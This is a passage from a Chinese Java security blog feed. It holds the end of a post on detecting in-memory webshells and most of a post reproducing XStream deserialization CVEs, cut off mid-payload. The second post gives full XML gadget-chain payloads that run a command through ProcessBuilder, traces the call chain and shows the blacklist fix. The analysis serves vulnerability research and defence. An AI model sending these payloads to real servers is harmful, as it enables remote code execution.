&lt;p&gt;无论是以上哪种攻击方式，从防守方的角度来说，检测的方式都是通过java instrumentation机制，将检测jar包attach到tomcat jvm，检查加载到jvm中的类是否异常。整体检测思路为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取tomcat jvm中所有加载的类&lt;/li&gt;
&lt;li&gt;遍历每个类，判断是否为风险类。我们把可能被攻击方新增/修改内存中的类，标记为风险类（比如实现了filter/servlet的类）&lt;/li&gt;
&lt;li&gt;遍历风险类，检查是否为webshell：&lt;/li&gt;
&lt;li&gt;检查高风险类的class文件是否存在；&lt;/li&gt;
&lt;li&gt;反编译风险类字节码，检查java文件中包含恶意代码&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;有攻有防，而防御又引发攻击的升级，冰蝎最新版已经加入了反VirtualMachine.Attach功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="冰蝎" scheme="http://m0d9.me/tags/%E5%86%B0%E8%9D%8E/"/>
    
    <category term="Attach" scheme="http://m0d9.me/tags/Attach/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化详解（二）</title>
    <link href="http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-05-10T09:04:00.000Z</published>
    <updated>2022-03-21T06:01:46.711Z</updated>
    
    <content type="html"><![CDATA[<p>前文已经讲过XStream的反序列化特性及漏洞产生的原因，以及&lt;=1.4.6版本的几个gadget，在此背景上，本节准备复现披露的几个RCE CVE，正向分析下。</p><p>XStream团队很有意思，安全公告会把POC也公开，具体可以看<a href="https://x-stream.github.io/security.html%E3%80%82">https://x-stream.github.io/security.html。</a></p><h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><p>这个其实就是Wh1t3p1g师傅中提到的第4个ImageIO gadget，在marshalsec gadgets ImageIO中也有，下面正向跟踪下。</p><h3 id="Wh1t3p1g师傅的POC"><a href="#Wh1t3p1g师傅的POC" class="headerlink" title="Wh1t3p1g师傅的POC"></a>Wh1t3p1g师傅的POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command class&#x3D;&quot;java.util.Arrays$ArrayList&quot;&gt;</span><br><span class="line">                        &lt;a class&#x3D;&quot;string-array&quot;&gt;</span><br><span class="line">                          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;-a&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;&#x2F;a&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><p>简单解释下调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 1. XStream 处理Map类型 去调用</span><br><span class="line">jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line"># 2. hashCode执行了this.value.toString()，将其中value设置为Base64Data</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line"># 3. Base64Data.toString执行了this.dataHandler.getDataSource().getInputStream()，指定其中属性dataHandler为javax.activation.DataHandler</span><br><span class="line">javax.activation.DataHandler#getDataSource</span><br><span class="line"># 4. DataHandler.getDataSource()返回属性类型为DataSource，该属性 置为XmlDataSource</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line"># 5. XmlDataSource 有个InputStream的属性，为getInputStream返回值，设置为CipherInputStream。</span><br><span class="line"># 回到步骤3，执行完getInputStream之后，执行了readFrom(is)，实际调用is.read</span><br><span class="line">javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line"># 6. CipherInputStream.read调用this.cipher.update()，其中指定cipher为NullCipher</span><br><span class="line">javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line"># 7. NullCipher.update执行了父类的方法Cipher.chooseFirstProvider，继续执行了this.serviceIterator.hasNext(),其中serviceIterator 置为FilterIterator</span><br><span class="line">javax.imageio.spi.FilterIterator#next</span><br><span class="line"># 8. FilterIterator.next执行了filter.filter()，其中filter为属性，置该属性为ContainsFilter实例</span><br><span class="line">javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line"># 9. ContainsFilter.filter执行了method.invoke(elt)，其中method为类属性可控，elt为参数，为iter的next()值</span><br><span class="line">ProcessBuilder#start</span><br></pre></td></tr></table></figure><h3 id="官网的POC"><a href="#官网的POC" class="headerlink" title="官网的POC"></a>官网的POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个POC大同小异，最不同点在FilterIterator的构造，涉及到filter.filter(elt) 中的elt是如何实现可控的</p><h3 id="控制elt"><a href="#控制elt" class="headerlink" title="控制elt"></a>控制elt</h3><p>这里是FilterIterator类的代码，目标是控制filter.filter(elt)中的elt，注意比较两个POC在FilterIterator这里的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#javax.imageio.spi.FilterIterator</span><br><span class="line">    <span class="keyword">private</span> Iterator&lt;T&gt; iter;</span><br><span class="line">    <span class="keyword">private</span> ServiceRegistry.Filter filter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">advance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            T elt = iter.next();</span><br><span class="line">            <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">                next = elt;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> next != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">        T o = next;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li><p>官网的java.util.ArrayList$Itr实现<br>用的是java.util.ArrayList$Itr<br>其中需要注意ArrayList.this，当ArrayList add/grow，都会更新ArrayList.elementData，所以iter.next()成功取到ProcessBuilder实例。<br><img src="/images/pasted-138.png" alt="upload successful"></p></li><li><p>Wh1t3p1g师傅的java.util.Collections$EmptyIterator实现<br>用的是java.util.Collections$EmptyIterator，这里注意嵌套了两层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator it = makeFilterIterator(</span><br><span class="line">                makeFilterIterator(Collections.emptyIterator(), obj, <span class="keyword">null</span>),</span><br><span class="line">                <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">                filter</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p> 这里的控制elt的思路如下：</p><ul><li>step1:利用的是EmptyIterator hasNext() 为false，构造了第一层FilterIterator iter1，使得iter1.next() = iter1.next</li><li>step2:再构造一层 FilterIterator iter2，iter2.iter=iter1,使得iter2.next() = iter2.iter1.next() = iter2.iter1.next</li></ul></li></ol><p><img src="/images/pasted-139.png" alt="upload successful"></p><h3 id="黑名单："><a href="#黑名单：" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.imageio.ImageIO$ContainsFilter</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><p>author: 钟师傅</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span 